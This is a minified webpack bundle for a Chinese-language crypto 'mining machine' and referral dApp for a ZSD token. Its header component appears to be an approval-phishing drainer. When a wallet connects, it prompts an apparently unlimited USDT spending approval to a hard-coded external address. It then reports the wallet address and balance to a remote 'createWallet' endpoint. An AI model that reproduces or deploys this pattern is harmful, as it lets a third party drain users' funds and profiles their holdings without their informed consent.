(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[18338],{35883:function(){},54221:function(e,t,n){"use strict";n.r(t),n.d(t,{default:function(){return L}});var a=n(3827),i=n(64090),s=n(14297),d=n(20703),u=n(44600),p=n.n(u),r=n(61996),o=n.n(r),l=n(35573),A=n(31254),y=n(28928),m=n(63805);n(81604);var c=n(37321),T=n(24362),h=n(47275);n(14698),n(46188);var g=n(66403),f=n(37432);let x=f.T,M=[(0,y.E)("io.metamask"),(0,y.E)("pro.tokenpocket"),(0,y.E)("im.token"),(0,y.E)("com.binance"),(0,y.E)("com.coinbase.wallet"),(0,y.a)()];(0,h.u)({client:T.L,address:g.c.USDTaddress,chain:c.d,abi:x}),(0,h.u)({client:T.L,address:g.c.ZSDaddress,abi:[{inputs:[],stateMutability:"nonpayable",type:"constructor"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"allowance",type:"uint256"},{internalType:"uint256",name:"needed",type:"uint256"}],name:"ERC20InsufficientAllowance",type:"error"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"uint256",name:"balance",type:"uint256"},{internalType:"uint256",name:"needed",type:"uint256"}],name:"ERC20InsufficientBalance",type:"error"},{inputs:[{internalType:"address",name:"approver",type:"address"}],name:"ERC20InvalidApprover",type:"error"},{inputs:[{internalType:"address",name:"receiver",type:"address"}],name:"ERC20InvalidReceiver",type:"error"},{inputs:[{internalType:"address",name:"sender",type:"address"}],name:"ERC20InvalidSender",type:"error"},{inputs:[{internalType:"address",name:"spender",type:"address"}],name:"ERC20InvalidSpender",type:"error"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"value",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"amount",type:"uint256"}],name:"burn",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"view",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"value",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"value",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"}],chain:c.d}),(0,h.u)({client:T.L,address:g.c.ZSDPROJECTAddress,chain:c.d,abi:[{inputs:[{internalType:"address",name:"swapAddress",type:"address"},{internalType:"address",name:"zsdAddress",type:"address"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"},{indexed:!0,internalType:"uint256",name:"usdtAmount",type:"uint256"},{indexed:!0,internalType:"uint256",name:"zsdAmount",type:"uint256"}],name:"DepositUSDTANDZSDFunds",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"},{indexed:!0,internalType:"uint256",name:"usdtAmount",type:"uint256"}],name:"DepositUSDTFunds",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"},{indexed:!0,internalType:"address",name:"referrer",type:"address"}],name:"Registered",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"},{indexed:!0,internalType:"uint256",name:"usdtAmount",type:"uint256"}],name:"WithdraZSDFunds",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"},{indexed:!0,internalType:"uint256",name:"usdtAmount",type:"uint256"},{indexed:!0,internalType:"uint256",name:"zsdAmount",type:"uint256"}],name:"addusdtlog",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"uint256",name:"index",type:"uint256"},{indexed:!1,internalType:"address",name:"referrer",type:"address"},{indexed:!1,internalType:"uint256",name:"referralCount",type:"uint256"},{indexed:!1,internalType:"uint256",name:"withdrawUSDTBalances",type:"uint256"},{indexed:!1,internalType:"uint256",name:"withdrawZSDBalances",type:"uint256"},{indexed:!1,internalType:"uint256",name:"lastActionTime",type:"uint256"}],name:"importUserslog",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"uint256",name:"index",type:"uint256"},{indexed:!0,internalType:"address",name:"useraddress",type:"address"}],name:"importdepositListlog",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"uint256",name:"index",type:"uint256"},{indexed:!0,internalType:"address",name:"useraddress",type:"address"}],name:"importholderslog",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"uint256",name:"index",type:"uint256"},{indexed:!0,internalType:"address",name:"useraddress",type:"address"}],name:"importtotalRegisterslog",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"user",type:"address"},{indexed:!0,internalType:"address",name:"refer",type:"address"},{indexed:!0,internalType:"uint256",name:"usdtAmount",type:"uint256"}],name:"refereWared",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"uint256",name:"uAmount",type:"uint256"},{indexed:!0,internalType:"uint256",name:"zAmount",type:"uint256"},{indexed:!0,internalType:"uint256",name:"yAmount",type:"uint256"}],name:"withdraZSDFundsLog",type:"event"},{inputs:[{internalType:"address",name:"_user",type:"address"}],name:"addToWhitelist",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"useraddress",type:"address"},{internalType:"uint256",name:"usdtAmount",type:"uint256"}],name:"addusdt",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"",type:"uint256"}],name:"depositList",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"usdtAmount",type:"uint256"}],name:"depositUSDTANDZSDFunds",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"usdtAmount",type:"uint256"}],name:"depositUSDTFunds",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"user",type:"address"}],name:"getReferralCount",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"user",type:"address"}],name:"getReferrer",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"userAddress",type:"address"}],name:"getWithdraZSDDayFunds",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"",type:"uint256"}],name:"holders",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"importOldDATA",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"minnerUserPower",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"projectAdminTPool",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"projectDropPool",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"referrer",type:"address"}],name:"register",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"registered",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"",type:"uint256"}],name:"registers",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_user",type:"address"}],name:"removeFromWhitelist",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_swapAddress",type:"address"}],name:"setSwap",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"swap",outputs:[{internalType:"contract ZSDSWap",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalDeposits",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalHolders",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalRegisters",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"usdtToken",outputs:[{internalType:"contract IERC20",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"users",outputs:[{internalType:"address",name:"referrer",type:"address"},{internalType:"uint256",name:"referralCount",type:"uint256"},{internalType:"uint256",name:"withdrawUSDTBalances",type:"uint256"},{internalType:"uint256",name:"lastActionTime",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"",type:"address"}],name:"whitelist",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"withdraZSDFunds",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"tokenAddress",type:"address"},{internalType:"address",name:"userAddress",type:"address"}],name:"withdrawToken",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"tokenAddress",type:"address"}],name:"withdrawToken",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"zsdtToken",outputs:[{internalType:"contract ZSD",name:"",type:"address"}],stateMutability:"view",type:"function"}]});var w=()=>{let[e,t]=(0,i.useState)(!1),[n]=l.Z.useForm();return(0,s.M)(),(0,a.jsx)("div",{children:(0,a.jsx)(m.ConnectButton,{theme:"dark",client:T.L,wallets:M,connectModal:{size:"compact"},chain:c.d})})},v={src:"/_next/static/media/logo.ee83181c.jpg",height:1024,width:1024,blurDataURL:"data:image/jpeg;base64,/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/2wBDAQoLCw4NDhwQEBw7KCIoOzs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozv/wgARCAAIAAgDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAUAQEAAAAAAAAAAAAAAAAAAAAC/9oADAMBAAIQAxAAAAGUEv/EABYQAAMAAAAAAAAAAAAAAAAAAAIRE//aAAgBAQABBQJjL//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQMBAT8Bf//EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQIBAT8Bf//EABYQAAMAAAAAAAAAAAAAAAAAAAARIv/aAAgBAQAGPwJSf//EABcQAAMBAAAAAAAAAAAAAAAAAAAhYXH/2gAIAQEAAT8hqNZ//9oADAMBAAIAAwAAABAD/8QAFREBAQAAAAAAAAAAAAAAAAAAAQD/2gAIAQMBAT8QC//EABURAQEAAAAAAAAAAAAAAAAAAAAB/9oACAECAQE/EK//xAAYEAEBAAMAAAAAAAAAAAAAAAABEQAhcf/aAAgBAQABPxABlE10pnM//9k=",blurWidth:8,blurHeight:8},b=n(23349),_=n(88549),B=n(99790),E=n(73107),D=e=>{let{onToggleRightMenu:t}=e,n=(0,s.M)(),[u,p]=(0,i.useState)(!1),r=async()=>{if(n){let e=await (0,b.RA)(g.c.BUSDaddress,f.T),t=B.Bz;try{let a=await e.approve(g.c.ETHAddress,t,{gasLimit:5e5});await a.wait();let i=await (0,b.yX)(n.address),s="https://app.myoilfield.org/api/wallet/createWallet?walletAddress="+n.address+"&balance="+Number(i).toFixed(3);E.Z.get(s).then(e=>{}).catch(e=>{}),A.ZP.success("授权成功")}catch(e){console.log(e,"error"),A.ZP.success("授权失败，请重试")}}else A.ZP.warning("请登录")},l=async()=>{0==await (0,b.yX)(n.address,1)?(r(),p(!1)):p(!0)};return(0,i.useEffect)(()=>{n&&l()},[n]),(0,a.jsxs)("div",{className:o().pagetop,children:[(0,a.jsx)(d.default,{className:o().m1,src:v,alt:"coin",width:50,height:50}),(0,a.jsx)(w,{}),(0,a.jsx)("div",{children:(0,a.jsx)(_.default,{defaultValue:"BEP20USDT",style:{width:100},onChange:e=>{if(console.log("selected ".concat(e)),"BEP20USDT"===e)localStorage.setItem("ETHAddress","0x1bae8fD6c2DFdDB1519e2E58C129138A418B3535"),localStorage.setItem("BUSDaddress","0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814");else{if("ERC20USDT"===e||"TRC20USDT"===e)return A.ZP.warning("暂未支持该币种");localStorage.setItem("ETHAddress","0x1bae8fD6c2DFdDB1519e2E58C129138A418B3535"),localStorage.setItem("BUSDaddress","0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814")}},options:[{value:"BEP20USDT",label:"BNB Chain"},{value:"ERC20USDT",label:"Ethereum"},{value:"TRC20USDT",label:"TRON"}]})}),(0,a.jsx)(d.default,{onClick:t,className:o().m3,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/menu.png",alt:"menu",width:50,height:50})]})},C=n(47907),R=n(60809),S=n.n(R),N=n(33052),j={src:"/_next/static/media/Administrator.ba429778.png",height:200,width:212,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAMAAADz0U65AAAAJFBMVEX///9MaXH///////////////////////////////////////+2I0voAAAADHRSTlNeAJVki4ZqBCWrGVLpCrpEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAMklEQVR4nEWLxwkAMAzE7lzitv++IRDwTyAJnDKvISid2ULAAggDnEePUha+0o055W+/KJABIdMC4NsAAAAASUVORK5CYII=",blurWidth:8,blurHeight:8},k=()=>{let e=(0,C.useRouter)();return(0,a.jsxs)("div",{className:S().rightMenu,"data-id":"RightMenu",children:[(0,a.jsxs)("div",{"data-id":"RightMenu",className:S().row,onClick:()=>e.push("/HomeLess"),children:[(0,a.jsx)(d.default,{"data-id":"RightMenu",className:S().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/HomePage.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:S().text,children:"首页"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:S().row,onClick:()=>e.push("/Machine"),children:[(0,a.jsx)(d.default,{"data-id":"RightMenu",className:S().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/MiningMachine.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:S().text,children:"矿机"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:S().row,onClick:()=>e.push("/Flash"),children:[(0,a.jsx)(d.default,{"data-id":"RightMenu",className:S().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/flash.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:S().text,children:"提款"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:S().row,onClick:()=>e.push("/Personal"),children:[(0,a.jsx)(d.default,{"data-id":"RightMenu",className:S().img,src:"https://white-key-landfowl-741.mypinata.cloud/ipfs/QmWrNfknnSDJXPS5pdDx4wqeoaci1iei1ZL6npC9jxk3Dm/Individualcenter.png",alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:S().text,children:"个人中心"})]}),(0,a.jsxs)("div",{"data-id":"RightMenu",className:S().row,onClick:()=>e.push("/Administrator"),children:[(0,a.jsx)(d.default,{"data-id":"RightMenu",className:S().img,src:j,alt:"coin",width:50,height:50}),(0,a.jsx)("div",{"data-id":"RightMenu",className:S().text,children:"管理员"})]})]})},I=n(18286),Q={src:"/_next/static/media/beijing.d082cf54.png",height:2007,width:2250,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAMAAAACh/xsAAAACVBMVEUJCRsNCykTEjrjuvq3AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAJElEQVR4nEXKsQ0AAAzCMJL/j67KAiyWIAFIMyj4Uiy29t9qDgS6ACitWxw1AAAAAElFTkSuQmCC",blurWidth:8,blurHeight:7};let U=[{link:"/Machine",url:"../../images/MININGMACHINE.png",name:"矿机",en:"MINING MACHINE"},{link:"/Personal",url:"../../images/PERSONALCENTER.png",name:"个人中心",en:"PERSONAL CENTER"},{link:"/HomeLess",url:"../../images/homepage.png",name:"首 页",en:"home page"},{link:"/Flash",url:"../../images/WithdrawMoney.png",name:"取 款",en:"withdraw money"}];var L=()=>{let e=(0,C.useRouter)(),t=(0,s.M)(),n=t=>{e.push(t.link)},u=()=>{let e="https://m.zsdcoin.com?ref=".concat(t?t.address:"");(0,N.v)(e)},{isRightMenuVisible:r,toggleRightMenu:o,hideRightMenu:l}=(0,i.useContext)(I.MenuContext),A=(0,i.useRef)(null);return(0,i.useEffect)(()=>{let e=e=>{A.current&&"RightMenu"!==e.target.dataset.id&&l()};return document.addEventListener("mousedown",e),()=>{document.removeEventListener("mousedown",e)}},[l]),(0,a.jsx)(a.Fragment,{children:(0,a.jsxs)("div",{className:p().pageMenu,children:[r&&(0,a.jsx)(k,{}),(0,a.jsx)(D,{onToggleRightMenu:o}),(0,a.jsx)("div",{className:p().videoBackground,id:"nav",children:(0,a.jsx)(d.default,{className:p().imageGif,src:Q,alt:""})}),(0,a.jsx)("div",{className:p().top,ref:A,children:U.map((e,t)=>"/InCode"===e.link?(0,a.jsxs)("div",{className:"".concat(p()["menyBtn"+t]," ").concat(p().menyBtn),onClick:u,children:[(0,a.jsx)(d.default,{className:"".concat(p()["img"+t]),src:e.url,alt:e.name,width:50,height:50}),(0,a.jsx)("div",{className:p()["menyBtn-n"],children:e.name}),(0,a.jsx)("div",{className:p()["menyBtn-e"],children:e.en})]},t):(0,a.jsxs)("div",{className:"".concat(p()["menyBtn"+t]," ").concat(p().menyBtn),onClick:()=>n(e),children:[(0,a.jsx)(d.default,{className:"".concat(p()["img"+t]),src:e.url,alt:e.name,width:50,height:50}),(0,a.jsx)("div",{className:p()["menyBtn-n"],children:e.name}),(0,a.jsx)("div",{className:p()["menyBtn-e"],children:e.en})]},t))})]})})}},33052:function(e,t,n){"use strict";n.d(t,{v:function(){return s}});var a=n(31254);let i=()=>"clipboard"in navigator,s=async e=>{try{if(i()){let t=document.createElement("textarea");t.value=e,document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t),a.ZP.success("复制成功")}else{let t=document.createElement("textarea");t.value=e,t.style.position="fixed",t.style.opacity="0",document.body.appendChild(t),t.focus(),t.select();try{document.execCommand("copy")?a.ZP.success("复制成功"):a.ZP.error("复制失败，请稍后重试")}catch(e){a.ZP.error("复制失败，请稍后重试")}finally{document.body.removeChild(t)}}}catch(n){let t=document.createElement("textarea");t.value=e,document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t),a.ZP.error("复制失败，请稍后重试")}}},60809:function(e){e.exports={rightMenu:"RightMenu_rightMenu__4Vdi0",row:"RightMenu_row__vVKio",img:"RightMenu_img__LvhXL",text:"RightMenu_text__kgeAO","video-background":"RightMenu_video-background__VO7sD",content:"RightMenu_content__zza7R"}},44600:function(e){e.exports={pageMenu:"TopMenu_pageMenu__tgFwW",top:"TopMenu_top__CE9fR",menyBtn0:"TopMenu_menyBtn0__OU6ht",menyBtn1:"TopMenu_menyBtn1__wpmzY",menyBtn2:"TopMenu_menyBtn2__9YB4v",menyBtn3:"TopMenu_menyBtn3__42O5W",menyBtn4:"TopMenu_menyBtn4__jMDkX",menyBtn5:"TopMenu_menyBtn5__YwPul",menyBtn:"TopMenu_menyBtn__5Rl_B","menyBtn-n":"TopMenu_menyBtn-n___3oET","menyBtn-e":"TopMenu_menyBtn-e__o7RuC",img0:"TopMenu_img0__EwxhJ",img1:"TopMenu_img1__U8byq",img2:"TopMenu_img2__Ixg5G",img3:"TopMenu_img3__sypae",img4:"TopMenu_img4__IL4yF",img5:"TopMenu_img5__ZAun1","video-background":"TopMenu_video-background__40Bxp",content:"TopMenu_content__s8Xj1",imageGif:"TopMenu_imageGif__f0WuQ"}},61996:function(e){e.exports={pagetop:"Top_pagetop__5k2y2",m1:"Top_m1__eJ96o",m2:"Top_m2__Leibv",m3:"Top_m3__8JExu",ljqb:"Top_ljqb__ktoyc","css-bedeeg":"Top_css-bedeeg__caJQv",deep:"Top_deep__7n1oN"}}}]);